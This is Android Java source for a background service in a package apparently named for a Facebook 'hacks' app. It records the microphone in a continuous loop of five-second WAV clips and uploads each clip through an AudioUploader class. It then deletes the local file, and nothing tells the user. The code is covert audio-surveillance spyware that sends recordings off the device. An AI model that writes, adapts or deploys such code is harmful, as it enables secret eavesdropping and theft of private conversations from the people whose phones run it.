package rsen.com.fbglobalhacks;

import android.app.Service;
import android.content.Intent;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.widget.Toast;

import java.io.File;

public class RecordAudioService extends Service {
    ExtAudioRecorder audioRecorder;
    String dir;
    boolean isRunning = false;
    public RecordAudioService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    Thread mainLoop;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            audioRecorder = ExtAudioRecorder.getInstanse(true);

            dir = Environment.getExternalStorageDirectory() + "/FBGlobalHacks/";
            File file = new File(dir);
            file.mkdirs();

            mainLoop = new Thread(new Runnable() {
                public void run() {
                    boolean firstTime = true;
                    while (!Thread.interrupted()) {
                        final String filePath = dir + System.currentTimeMillis() + ".wav";
                        if (audioRecorder != null) {
                            recordAudio(firstTime, filePath);
                        }
                        firstTime = false;
                        try {
                            Thread.sleep(5000);
                            if(audioRecorder != null) {
                                audioRecorder.stop();
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        AudioUploader.doFileUpload(filePath);
                                        new File(filePath).delete();
                                    }
                                }).start();
                            }
                        } catch (InterruptedException e) {
                            return;
                        }
                    }

                }
            });
            mainLoop.start();
        }
        return super.onStartCommand(intent, flags, startId);
    }
    @Override
    public void onDestroy() {
        mainLoop.interrupt();
        isRunning = false;
        audioRecorder.release();
        audioRecorder = null;
        super.onDestroy();
    }

    private void recordAudio(boolean firstTime, String filePath)
    {
        if (!firstTime)
        {
            audioRecorder.reset();
        }
        audioRecorder.setOutputFile(filePath);
        audioRecorder.prepare();
        audioRecorder.start();
    }

}
